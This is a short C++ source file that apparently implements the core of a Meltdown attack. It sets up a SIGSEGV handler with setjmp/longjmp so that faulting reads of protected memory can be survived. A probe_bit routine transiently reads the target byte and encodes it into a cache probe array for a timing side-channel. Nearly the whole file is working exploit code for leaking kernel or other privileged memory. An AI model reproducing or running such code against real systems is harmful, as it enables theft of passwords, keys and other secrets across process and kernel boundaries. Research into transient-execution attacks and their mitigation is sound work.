#include "spectre_meltdown.h"
#include <signal.h>
#include <setjmp.h>
#include <string>

static jmp_buf signsegv_jmp;
static sighandler_t old_sigsegv_handler;

static void sigsegv_handler(int signum) {
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, signum);
    sigprocmask(SIG_UNBLOCK, &sigs, NULL);
    longjmp(signsegv_jmp, 1);
}

void spectre::Meltdown::before() {
    old_sigsegv_handler = signal(SIGSEGV, sigsegv_handler);
    if (old_sigsegv_handler == SIG_ERR) {
        throw std::string("Failed to setup signal handler");
    }
}

void spectre::Meltdown::after() {
    signal(SIGSEGV, old_sigsegv_handler);
}

void spectre::Meltdown::probe_bit(int tries, uint8_t mask, const uint8_t* data, const uint8_t* cache_probe) {
    for (int i=0; i<100; i++) {
        if (!setjmp(signsegv_jmp)) {
            volatile uint8_t value;
            do {
                value =  *data;
            } while (!value);
            volatile uint8_t tmp = cache_probe[(value & mask) * CACHE_LINE_SIZE];
        }
    }
}
